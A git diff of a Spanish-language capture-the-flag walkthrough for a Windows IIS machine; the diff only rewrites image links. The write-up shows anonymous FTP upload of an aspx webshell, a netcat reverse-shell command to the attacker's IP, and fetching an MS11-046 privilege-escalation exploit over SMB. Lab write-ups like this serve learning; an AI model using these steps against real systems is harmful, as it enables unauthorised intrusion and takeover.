@@ -14,7 +14,7 @@ Microsoft Windows (x86) – ‘afd.sys’ (MS11-046) [Privilege Escalation]
 
 **Vamos a empezar** como siempre con los primeros escaneos de rutina empezando por establecer una conexión **icmp** con **ping** 
 
-![[Pasted image 20251111150706.png]]
+![](../imgs/Pasted image 20251111150706.png)
 
 Vemos que estamos ante una maquina **windows** por lo que proseguimos a hacer los 2 escaneos fundamentales. 
 
@@ -22,7 +22,7 @@ Vemos que estamos ante una maquina **windows** por lo que proseguimos a hacer lo
 
 **El segundo escaneo lo ocupamos para recopilar mayor información sobre los puertos previamente encontrados**. 
 
-![[Pasted image 20251111150747.png]]
+![](../imgs/Pasted image 20251111150747.png)
 
 Dentro de los puertos encontrados, encontramos el puerto **21** que corresponde a [[FTP]], y además encontramos el puerto **80** que corresponde a una página web. **Además nmap nos arrojó que el usuario anonymous está permitido**. 
 
@@ -32,33 +32,33 @@ Nos conectamos a **FTP** con anoymous y encontramos una **.png**. **Para descarg
 binary
 ```
 
-![[Pasted image 20251111150904.png]]
+![](../imgs/Pasted image 20251111150904.png)
 
 ```bash
 get welcome.png
 ```
-![[Pasted image 20251111151002.png]]
+![](../imgs/Pasted image 20251111151002.png)
 Conseguimos la imagen y la abrimos con la misma **kitty**
 ```bash
 
 kitty +kitten icat welcome.png
 ```
 
-![[Pasted image 20251111151107.png]]
+![](../imgs/Pasted image 20251111151107.png)
 
 **Además de la imagén; En el escaneo secundario encontramos también información sobre [[IIS]]**. 
 
 Ahora ya teniendo eso, proseguimos a inspeccionar la web que hay en el **puerto 80**. 
 
-![[Pasted image 20251111151656.png]]
+![](../imgs/Pasted image 20251111151656.png)
 
 Es la misma imagen que había en **[[FTP]]**. **Posiblemente los recursos de la web también se comparten por [[FTP]]** por lo que proseguimos a ver si los archivos en **FTP** también están disponibles en la web. 
 
 **De entrada no nos arroja error**
 
-![[Pasted image 20251111152005.png]]
+![](../imgs/Pasted image 20251111152005.png)
 
-![[Pasted image 20251111152021.png]]
+![](../imgs/Pasted image 20251111152021.png)
 *Si cambiamos por .html arroja error*
 
 ##### SEGUNDA FASE: Explotación
@@ -71,9 +71,9 @@ Una vez que determinamos **que posiblemente está sincronizado [[FTP]] con el se
 put test.txt
 ```
 
-![[Pasted image 20251111152627.png]]
+![](../imgs/Pasted image 20251111152627.png)
 
-![[Pasted image 20251111152710.png]]
+![](../imgs/Pasted image 20251111152710.png)
 
 **Tenemos capacidad de escritura** por lo que proseguimos a mandar un archivo **[[aspx]]**.
 
@@ -82,7 +82,7 @@ put test.txt
 ```bash
 locate .aspx
 ```
-![[Pasted image 20251111154118.png]]
+![](../imgs/Pasted image 20251111154118.png)
 
 Usamos el primero **/davtest/backdoors/aspx_cmd.aspx**, lo copiamos a nuestra carpeta de trabajo
 **Lo subimos a FTP** Y vemos la respuesta a nivel web
@@ -92,7 +92,7 @@ Usamos el primero **/davtest/backdoors/aspx_cmd.aspx**, lo copiamos a nuestra ca
 put aspx_cmd.aspx
 ```
 
-![[Pasted image 20251111154323.png]]
+![](../imgs/Pasted image 20251111154323.png)
 
 **Podemos ejecutar comandos** a través de una **webshell**.
 Como ya sabemos que a través de **[[FTP]]** podemos subir archivos, subimos [[NETCAT]]. 
@@ -105,31 +105,31 @@ locate nc.exe
 
 lo copiamos en nuestro directorio y lo subimos por **[[FTP]]**
 
-![[Pasted image 20251112082613.png]]
+![](../imgs/Pasted image 20251112082613.png)
 
 **Del lado del servidor [[IIS]] tenemos que acceder a la ruta donde posiblemente nc.exe se almacenó**, recordemos que en sistemas **IIS** la ruta en la que generalmente se almacenan las aplicaciones y recursos es:
 
 **c:\inetpub\wwwroot\
 
-![[Pasted image 20251112083102.png]]
+![](../imgs/Pasted image 20251112083102.png)
 **ya que localizamos el nc.exe, ahora lo ejecutamos y nos entablamos una [[Reverse shell.]]** 
 
 ```cmd
 c:\inetpub\wwwroot\nc.exe -e cmd 10.10.16.6 4444
 ```
 
-![[Pasted image 20251112084509.png]]
+![](../imgs/Pasted image 20251112084509.png)
 
 ##### TERCERA FASE: Post explotación - Privesc
 
 **Ya teniendo conexión a la maquina** proseguimos a escalar privilegios. Utilizando los **[[Comandos utiles para escalar]]** revisamos los de windows.
 
 **La versión usada es una versión antigua**
-![[Pasted image 20251112085224.png]]
+![](../imgs/Pasted image 20251112085224.png)
 
 **Buscamos algún exploit** por la versión encontrada 
 
-![[Pasted image 20251112085323.png]]
+![](../imgs/Pasted image 20251112085323.png)
 
 Basandonos en **[[MS11-046]]** buscamos algún exploit en github. 
 Lo descargamos y lo compartimos a través de **SMB**
@@ -155,4 +155,4 @@ copy \\10.10.16.6\smbFolder\ms11-046.exe .
 
  lo ejecutamos y listo. 
 
-![[Pasted image 20251112091436.png]]
+![](../imgs/Pasted image 20251112091436.png)
